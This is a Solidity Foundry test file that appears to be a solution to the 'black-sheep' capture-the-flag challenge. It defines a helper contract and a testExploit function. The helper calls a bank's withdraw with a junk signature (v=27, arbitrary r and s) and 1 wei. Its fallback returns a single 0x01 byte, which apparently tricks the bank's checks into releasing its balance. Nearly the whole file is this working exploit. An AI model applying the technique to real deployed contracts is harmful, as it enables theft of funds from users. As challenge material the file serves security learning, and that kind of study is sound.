// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/black-sheep/Challenge.sol";

contract ChallengeHelper {
    ISimpleBank public immutable BANK;

    constructor(ISimpleBank bank) {
        BANK = bank;
    }

    function deposit() public payable {}

    function withDraw() public payable {
        BANK.withdraw{value: 1}(
            keccak256("dumb"),
            27,
            keccak256("fasdfsdafsdfsd"),
            keccak256("sdafasdfasdfsdf")
        );
    }

    fallback(bytes calldata) external returns (bytes memory) {
        bytes memory bytesArray = new bytes(1);
        bytesArray[0] = bytes1(0x01);
        return bytesArray;
    }

    function isSolved() external view returns (bool) {
        return address(BANK).balance == 0;
    }
}

contract ContractTest is Test {
    Challenge challenge = Challenge(vm.envAddress("CHALLENGE_ADDRESS"));
    address sender = vm.addr(vm.envUint("PRIVATE_KEY"));

    ISimpleBank bank;
    ChallengeHelper helper;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        bank = challenge.BANK();
        helper = new ChallengeHelper(bank);
    }

    // console.log("address(this)", address(this));
    // console.log("address(challenge)", address(challenge));
    // console.log("address(bank)", address(bank));
    // console.log("address(helper)", address(helper));
    //0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496 = test contract logic
    //0x7F9fc124E28E6c35258f24eB27526e661E88128B = challenge contract logic
    //0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38 = msg.sender
    //0xBd770416a3345F91E4B34576cb804a576fa48EB1 = bank contract logic
    //0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f = helper contract logic

    function testExploit() public {
        bank = challenge.BANK();
        helper.deposit{value: 1 ether}();

        vm.prank(sender);
        helper.withDraw();
        console.log(challenge.isSolved());
    }
}
